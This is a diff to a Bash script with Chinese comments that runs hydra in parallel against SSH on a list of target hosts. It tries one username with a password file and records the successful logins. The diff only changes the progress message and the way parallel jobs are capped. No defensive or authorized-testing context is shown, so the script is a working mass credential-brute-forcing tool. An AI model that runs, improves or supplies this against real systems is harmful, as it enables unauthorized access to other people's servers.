@@ -32,27 +32,25 @@ nl -w1 -s' ' "$TARGET_FILE" > "$temp_file"
 process_line() {
   local line_num=$1
   local target=$2
-  echo "[$line_num/$line_count] 正在处理: $target"
+  echo "正在处理[$line_num/$line_count]: $target"
   hydra -l "$USER" -P "$PASS_FILE" "$target" ssh 2>&1 | grep "\[22\]\[ssh\]" >> "$RESULT_FILE"
 }
 
 # 读取临时文件并使用后台作业并行处理
-jobs=()
+job_count=0
 while IFS= read -r line; do
+  while [ $(jobs | wc -l) -ge "$THREADS" ]; do
+    # 等待任意一个作业完成
+    wait -n
+  done
+
   line_num=$(echo "$line" | awk '{print $1}')
   target=$(echo "$line" | awk '{print substr($0, index($0, $2))}')
   process_line "$line_num" "$target" &
   
-  # 保持后台作业的数量在限制内
-  if [ ${#jobs[@]} -ge "$THREADS" ]; then
-    wait -n
-    jobs=()
-  fi
-  
-  jobs+=($!)
 done < "$temp_file"
 
-# 等待所有后台作业完成
+# 等待所有剩余的后台作业完成
 wait
 
 # 清理临时文件
